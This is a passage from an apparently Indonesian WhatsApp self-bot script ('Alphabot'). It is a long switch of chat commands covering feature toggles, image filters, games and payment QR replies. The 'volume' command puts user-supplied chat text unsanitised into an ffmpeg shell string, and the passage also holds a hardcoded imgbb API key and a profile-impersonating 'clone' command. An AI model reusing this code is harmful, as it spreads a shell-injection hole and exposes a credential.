          bugc = false
          antitrol = false
          reply(lang.anjawaOff(command))
          } else if (!q) {
          sendButMessage(from, `MODE ANTIBUG`, `Choose one`, [
            {
              buttonId: 'antibug on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antibug off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
          case 'antidelete':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (antidel === true) return reply(lang.anjawaUdhOn(command))
antidel = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (antidel === false) return
antidel = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE ANTI DELETE`, `Choose one`, [
            {
              buttonId: 'antidelete on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antidelete off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'anticall':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (antical === true) return reply(lang.anjawaUdhOn(command))
antical = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (antical === false) return
antical = false
reply(lang.anjawaOff(command))
} else {
reply(lang.onORoff(command))
}
break
case 'autoketik':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (autoketik === true) return reply(lang.anjawaUdhOn(command))
autoketik = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (autoketik === false) return
autoketik = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE AUTO KETIK`, `Choose one`, [
            {
              buttonId: 'autoketik on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'autoketik off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        case 'autorespon': case 'autorespond':
      if (!isOwner && !isCreator && !mek.key.fromMe) return reply(lang.onlyOwner())
       if (q === 'on'){
           	if (autorespon === false) return reply(lang.anjawaUdhOn(command))
              autorespon = false
                    reply(lang.anjawaOn(command))
                } else if (q === 'off'){
                	if (autorespon === true) return
                    autorespon = true
                    reply(lang.anjawaOff(command))
                } else if (!q) {
          sendButMessage(from, `MODE AUTO RESPON`, `Choose one`, [
            {
              buttonId: 'autorespon on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'autorespon off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'autobio':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (autobio === true) return reply(lang.anjawaUdhOn(command))
autobio = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (autobio === false) return
autobio = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE AUTO BIO`, `Choose one`, [
            {
              buttonId: 'autobio on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'autobio off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        case 'antihidetag':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (antihidetag === true) return reply(lang.anjawaUdhOn(command))
antihidetag = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (antihidetag === false) return
antihidetag = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE ANTI HIDETAG`, `Choose one`, [
            {
              buttonId: 'antihidetag on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antihidetag off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'autovn':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (autovn === true) return reply(lang.anjawaUdhOn(command))
autovn = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (autovn === false) return
autovn = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE AUTO VN`, `Choose one`, [
            {
              buttonId: 'autovn on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'autovn off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        case 'autoregis': case 'register':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (autoregister === true) return reply(lang.anjawaUdhOn(command))
autoregister = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (autoregister === false) return
autoregister = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE AUTO REGISTER`, `Choose one`, [
            {
              buttonId: 'register on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'register off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'wanted':
case 'utatoo':
case 'unsharpen':
case 'thanos':
case 'sniper':
case 'sharpen':
case 'sepia':
case 'scary':
case 'rip':
case 'redple':
case 'rejected':
case 'posterize':
case 'ps4':
case 'pixelize':
case 'missionpassed':
case 'moustache':
case 'lookwhatkarenhave':
case 'jail':
case 'invert':
case 'instagram':
case 'greyscale':
case 'glitch':
case 'gay':
case 'frame':
case 'fire':
case 'distort':
case 'dictator':
case 'deepfry':
case 'ddungeon':
case 'circle':
case 'challenger':
case 'burn':
case 'brazzers':
case 'beautiful':
console.log(command + '  -> Mungkin fitur ini masih suka eror ngab jadi fix sendiri ya')
     var imgbb = require('imgbb-uploader')
     if (isQuotedImage) {
     reply(lang.wait())
     let ppk = await alpha.getProfilePicture(sender).catch(_ => 'https://telegra.ph/file/6ea2baa958c1d4c68fb73.png')
	 thumbnya = await getBuffer(ppk)
   var bioij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
    var delib = await alpha.downloadAndSaveMediaMessage(bioij, `./media/${sender}.png`)
    let  datau = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", delib)
     anuk = `${datau.display_url}`
     ini_gen = `${command}`
     console.log(color(ini_gen))
     imoj = await ameApi.generate(ini_gen, { url: anuk})
     alpha.sendFile(from, imoj, `${sender}.png`, null, mek, {thumbnail: thumbnya})
     } else {
     	reply(lang.wait())
		ghost = mek.message.extendedTextMessage.contextInfo.participant || mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
		let oppp = await alpha.getProfilePicture(ghost).catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
		let medianya = await getBuffer(oppp)
		let datae = await imageToBase64(JSON.stringify(oppp).replace(/\"/gi, ''))
		fs.writeFileSync('janckuk.jpeg', datae, 'base64')
		let odata = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", 'janckuk.jpeg')
		anuk = `${odata.display_url}`
     ini_gen = `${command}`
     console.log(color(ini_gen))
     imoj = await ameApi.generate(ini_gen, { url: anuk})
     alpha.sendFile(from, imoj, `${sender}.png`, null, mek, {thumbnail: medianya})
     } 
     break
 case 'volume':
if (!isQuotedAudio) return reply('Reply audio!')
let encmedia3 = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let media3 = await alpha.downloadAndSaveMediaMessage(encmedia3)
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media3)
if (err) return reply('Error!')
jadie = fs.readFileSync(rname)
alpha.sendMessage(from, jadie, audio, {mimetype: 'audio/mp4', ptt: true, quoted: ftroli})
fs.unlinkSync(rname)
}
)
case 'balik':
if (!isQuotedAudio) return reply('Reply audio!')
	let encmedia4 = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	let media4 = await alpha.downloadAndSaveMediaMessage(encmedia4)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media4} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media4)
if (err) return reply('emror')
hihi = fs.readFileSync(ran)
alpha.sendMessage(from, hihi, audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek})
fs.unlinkSync(ran)
	})
break
break
			case 'banlist': case 'blocklist': case 'listban': case 'listblock': 
          teks = '╭────「 *BANNED  LIST* 」\n'
          for (let hui of banned) {
            teks += `│+  @${hui.split('@')[0]}\n`
          }
          teks += `│+ Total : ${banned.length}\n╰──────「 *ALPHA BOT* 」────`
          alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": [hui] } })
          break
 		case 'ban': case 'banned': case 'block':
          if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
          bnnd = `${args[0].replace('@', '')}@s.whatsapp.net`
					banned.push(bnnd)
					fs.writeFileSync('./src/banned.json', JSON.stringify(banned))
					fakestatus(`Nomor ${bnnd} telah dibanned!`)
          break

        case 'unban': case 'unbannned': case 'unblock':
          if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
          ya = `${args[0].replace('@', '')}@s.whatsapp.net`
					unb = banned.indexOf(ya)
					banned.splice(unb, 1)
					fs.writeFileSync('./src/banned.json', JSON.stringify(banned))
					fakestatus(`Nomor ${ya} telah di unban!`)
          break
          case 'darkjokes':
					let data = fs.readFileSync('./src/darkjokes.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					alpha.sendMessage(from, hasil, image, {thumbnail: Buffer.alloc(0), quoted: fgclink})
					break
					/*case 'save':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if(!q) return reply(`${prefix}save nama|nomor , Nomor Harus Berupa Kode Negara 62xxx`)
nma = q.split('|')[0]
nmor = q.split('|')[1]
if(!nma) return reply('Format salah!')
if(!nmor) return reply('Format salah!')
H1 = {
nama : nma,
nomor : nmor
}
save.push(H1)
fs.writeFileSync('./lib/sv.js', JSON.stringify(save))
alpha.sendMessage(from, `Oke Sudag Tersimpan`, MessageType.text, { quoted: mek})		     	 
break
case 'mutual':
data = fs.readFileSync('./lib/sv.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
randIndex2 = Math.floor(Math.random() * jsonData.length);
randKey2 = jsonData[randIndex2];
randIndex3 = Math.floor(Math.random() * jsonData.length);
randKey3 = jsonData[randIndex3];
let mutual = `*Nama*: ${randKey.nama}\n*Nomor*: wa.me/${randKey.nomor}\n\n*Nama*: ${randKey2.nama}\n*Nomor*: wa.me/${randKey2.nomor}\n\n*Nama*: ${randKey3.nama}\n*Nomor*: wa.me/${randKey3.nomor}`
reply(mutual)
break*/
		
			case 'clone':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (!isGroup) return reply(lang.onlygc())
if (args.length < 1) return reply('Tag target yang ingin di clone')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag cvk')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
let { jid, idk, notify } = groupMembers.find(x => x.jid === mentioned)
try {
var pp = await alpha.getProfilePicture(idk)
buffer = await getBuffer(pp)
alpha.updateProfilePicture(botNumber, buffer)
mentions(`Foto profile Berhasil di perbarui menggunakan foto profile @${id.split('@')[0]}`, [jid], true)
} catch (e) {
reply('Emror')
}
break
case 'tes': case 'bot':
var ini_gopayyp = `${ucapannya2}\nBot sudah on kak silahkan di pakai`
var buttonsos = [
{buttonId: 'Menu', buttonText: {displayText: 'Menu'}, type: 1},
{buttonId: 'runtime', buttonText: {displayText: 'Runtime'}, type: 1}]

butptonMessagee = {
contentText: ini_gopayyp,
footerText: `${tampilTanggal}\n${tampilWaktu}` ,
buttons: buttonsos,
headerType: 1
}
alpha.sendMessage(from,  butptonMessagee, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender]
            },
			quoted: fgclink,sendEphemeral: true 
			})
			break
case 'absensi':
                 if (!isGroup) return reply(lang.onlygc())
absen.push(sender)
fs.writeFileSync('./src/absen.json', JSON.stringify(absen))
teks = `*LIST DAFTAR HADIR ABSEN*:${enter}`
for (let sensi of absen) {
teks += `${enter}々 @${sensi.split('@')[0]} ✓${enter}`
}
teks += `TOTAL MEMBER YG ABSEN : ${absen.length}${enter}${enter}Ketik ${prefix}absensi untuk absen, Daftar list absen akan dikumpulkan setelah waktu yang diberikan telah berakhir!`
alpha.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": absen}})
break

case 'absen':
if (!isGroup) return reply(lang.onlygc())
if (args.length < 1) return reply(`Cara Memulai Absen Silahkan Ketik${enter}${enter}${prefix}absen waktu${enter}${enter}list menit yang tersedia.${enter}${enter}600000 | 1200000 | 1800000${enter}${enter}jadi ${prefix}absen 600000`)
tem = args.join(" ")
ini = absen.indexOf(from)
absen.splice(ini, 1)
fs.writeFileSync('./src/absen.json', JSON.stringify(absen))
teks = `*LIST DAFTAR HADIR*:${enter}`
for (let sensi of absen) {
teks += `${enter}々 @${sensi.split('@')[0]} ✓${enter}`
}
teks += `ABSENSI : ${sensi.length}${enter}${enter}Ketik ${prefix}absensi untuk absen, Daftar list absen akan dikumpulkan setelah waktu yang diberikan telah berakhir!`
reply(`List Presentasi Hadir Telah Siap${enter}${enter}Ketik ${prefix}absensi untuk absen, Daftar list absen akan dikumpulkan setelah waktu yang diberikan telah berakhir!`)
setTimeout( () => {
reply(`Waktu Absensi Telah Habis`)
alpha.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": absen}})
}, tem)
setTimeout( () => {
ini = absen.indexOf(from)
absen.splice(ini, 1)
fs.writeFileSync('./src/absen.json', JSON.stringify(absen))
}, tem)
break

		  case 'tebakin': case 'tebakgambar':
					if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`${ApiZeks}/api/tebakgambar?apikey=${zeksApikey}`)
                    resu = anu.result
                    tebak = resu.soal
                    jawaban = resu.jawaban
                    tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/tebakgambar.json", JSON.stringify(tebakgambar))
                    console.log(jawaban)
                    tebakya = await getBuffer(tebak)
                    alpha.sendMessage(from, tebakya, image, { quoted: mek, caption: "Nih kak silahkan dijawab ><" })
                   await sleep(60000)
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete tebakgambar[sender.split('@')[0]]
                        fs.writeFileSync("./src/tebakgambar.json", JSON.stringify(tebakgambar))
                    }
                    break
				case 'caklontong':
					if (caklontong.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`https://x-restapi.herokuapp.com/api/caklontong?apikey=BETA`)
                    tebakya = anu.soal
                    tebak = `Pertanyaan : ${tebakya}`
                    jawaban = anu.jawaban
                    caklontong[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/caklontong.json", JSON.stringify(caklontong))
                    console.log(jawaban)
                    alpha.sendMessage(from, tebak, text, { quoted: mek })
                   await sleep(60000)
                    if (caklontong.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete caklontong[sender.split('@')[0]]
                        fs.writeFileSync("./src/caklontong.json", JSON.stringify(caklontong))
                    }
                    break
				case 'family100':
					if (family.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`https://x-restapi.herokuapp.com/api/family100?apikey=BETA`)
                    tebakya = anu.soal
                    tebak = `Pertanyaan : ${tebakya}`
                    jawaban = anu.jawaban
                    family[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/family100.json", JSON.stringify(family))
                    console.log(jawaban)
                    alpha.sendMessage(from, tebak, text, { quoted: mek })
                   await sleep(60000)
                    if (family.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete family[sender.split('@')[0]]
                        fs.writeFileSync("./src/family100.json", JSON.stringify(family))
                    }
                    break
				case 'tebakanime':
					if (tebakanime.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`https://x-restapi.herokuapp.com/api/tebak-anime?apikey=BETA`)
                    tebak = anu.soal
                    jawaban = anu.jawaban
                    tebakanime[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/tebakanime.json", JSON.stringify(tebakanime))
                    console.log(jawaban)
                    tebakya = await getBuffer(tebak)
                    alpha.sendMessage(from, tebakya, image, { quoted: mek, caption: "Nih kak silahkan dijawab ><" })
                   await sleep(60000)
                    if (tebakanime.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete tebakanime[sender.split('@')[0]]
                        fs.writeFileSync("./src/tebakanime.json", JSON.stringify(tebakanime))
                    }
                    break
            case 'suit': 
              if (!q) return reply(`Kirim perintah ${prefix}suit gunting / batu / kertas`)
              const userspilih = q
              if (!userspilih.match(/batu|gunting|kertas/)) return reply(`Pilih batu, kertas, gunting`)
              var computer = Math.random();
              if (computer < 0.34 ) {
              computer = 'batu';
              } else if( computer >= 0.34 && computer < 0.67) {
              computer = 'gunting';
              } else {
              computer = 'kertas';
}
              if ( userspilih == computer ) {
              reply(`Pertandingan Seri!`)
              } else if ( userspilih == 'batu' ) {
              if( computer == 'gunting' ) {
              reply(`Kamu memilih Batu dan bot Gunting\nKamu menang!`)
              } else {
              reply(`Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!`)
}
              } else if ( userspilih == 'gunting' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!`)
              } else {
              reply(`Kamu memilih Gunting dan bot Kertas\nKamu menang!`)
}
              } else if ( userspilih == 'kertas' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Kertas dan bot Batu\nKamu menang!`)
              } else {
              reply(`Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah`)
}
}
              break
				default:
				if (budy.includes("Ownerbot",'ownerbot')){
					console.log(color('[ CMD ]', 'aqua'), 'Ownerbot', color(pushname))
 members_ids = []
		            for (let mem of groupMembers) {
		            members_ids.push(mem.jid)
		            }
			         ini_ownerNumber = [`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`]
					let ini_list = []
					for (let i of ini_ownerNumber) {
					const vname_ = alpha.contacts[i] != undefined ? alpha.contacts[i].vname || alpha.contacts[i].notify : undefined
					ini_list.push({
					"displayName": 'Owner Alphabot',
					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname_ ? `${vname_}` : `${alpha.user.name}`}\nｖｙｎｕｔｚｘｘ２２;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
					})
					}
					hehe = await alpha.sendMessage(from, {
					"displayName": `${ini_list.length} kontak`,
					"contacts": ini_list 
					}, 'contactsArrayMessage', { quoted: fkontak, contextInfo: {"mentionedJid": members_ids}})
					alpha.sendMessage(from,'Nih Kak Owner Ku',text,{quoted: hehe})
} 
if (subscribezeeoneofc == 'statiktiknya') {
anuui = process.uptime()
const timestampnya = speed();
					const latensinya = speed() - timestampnya
teks = `\`\`\`「 STATISTIK BOT 」\`\`\`

${petik}々 Base : SELF-BOT${petik}
${petik}々 Lib : Baileys, 3.5.2${petik}
${petik}々 Prefix : ${prefix}${petik}
${petik}々 Versi Bot : v0.0.7${petik}

${petik}々 Merk HP : ${device_manufacturer}${petik}
${petik}々 Versi OS : ${os_version}${petik}
${petik}々 Versi HP : ${device_model}${petik}
${petik}々 MCC : ${mcc}${petik}
${petik}々 MNC : ${mnc}${petik}
${petik}々 Baterai : ${isBattre}${petik}
${petik}々 Charger : ${isCharge}${petik}
${petik}々 Whatsapp : ${wa_version}${petik}
${petik}々 Blockir : ${banned.length} Blocked${petik}
${petik}々 Group Chat : ${totalgroup.length} Chat${petik}
${petik}々 Personal Chat : ${totalkontak.length} Chat${petik}
${petik}々 Total Chat : ${totalchat.length} Chat${petik}
${petik}々 Speed : ${latensinya.toFixed(4)} Second${petik}
${petik}々 Runtime : ${kyun(anuui)}${petik}`
fakeitem(teks)
}
if (subscribezeeoneofc == "ownerku"){
					console.log(color('[ CMD ]', 'aqua'), 'Ownerbot', color(pushname))
 
			         ini_ownerNumber = [`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`]
					let ini_list = []
					for (let i of ini_ownerNumber) {
					const vname_ = alpha.contacts[i] != undefined ? alpha.contacts[i].vname || alpha.contacts[i].notify : undefined
					ini_list.push({
					"displayName": 'Owner Alphabot',
					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname_ ? `${vname_}` : `${alpha.user.name}`}\nｖｙｎｕｔｚｘｘ２２;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
					})
					}
					hehe = await alpha.sendMessage(from, {
					"displayName": `${ini_list.length} kontak`,
					"contacts": ini_list 
					}, 'contactsArrayMessage', { quoted: fkontak})
					var ini_gopayy =`Halo @${sender.split("@")[0]} itu owner ku, jangan lupa donasi kak😇`
var buttonss = [
{buttonId: 'donasi', buttonText:{displayText: 'Donasi'}, type: 1},
{buttonId: 'sewa_kak', buttonText:{displayText: 'Sewa'}, type: 1}
] 

buttonMessagee = {
contentText: ini_gopayy,
footerText: `${tampilTanggal}\n${tampilWaktu}\n\n© ${creator}` ,
buttons: buttonss,
headerType: 1
}
alpha.sendMessage(from,  buttonMessagee, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender]
            },
			quoted: ftoko,sendEphemeral: true 
			})
} 
if(subscribezeeoneofc == 'qr_gopay1'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	send_qr_gopay(gambar_gopay_nya, mek)
}    
if(subscribezeeoneofc == 'qr_dana1'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	send_qr_dana(gambar_dana_nya, mek)
}    
if(subscribezeeoneofc == 'qr_ovo1'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	send_qr_ovo(gambar_ovo_nya, mek)
}    
if(subscribezeeoneofc == 'qr_ovo13'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Minggu_ 
•> Harga : ${_minggu}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${_minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana13'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Minggu_ 
•> Harga : ${_minggu}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${_minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_gopay13'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Minggu_ 
•> Harga : ${_minggu}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${_minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    

if(subscribezeeoneofc == 'qr_ovo14'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _2 Minggu_ 
•> Harga : ${__minggu}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${__minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana14'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _2 Minggu_ 
•> Harga : ${__minggu}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${__minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_gopay14'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _2 Minggu_ 
•> Harga : ${__minggu}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${__minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}

if(subscribezeeoneofc == 'qr_ovo15'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _3 Minggu_ 
•> Harga : ${___minggu}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${___minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana15'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _3 Minggu_ 
•> Harga : ${___minggu}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${___minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
}    
if(subscribezeeoneofc == 'qr_gopay15'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
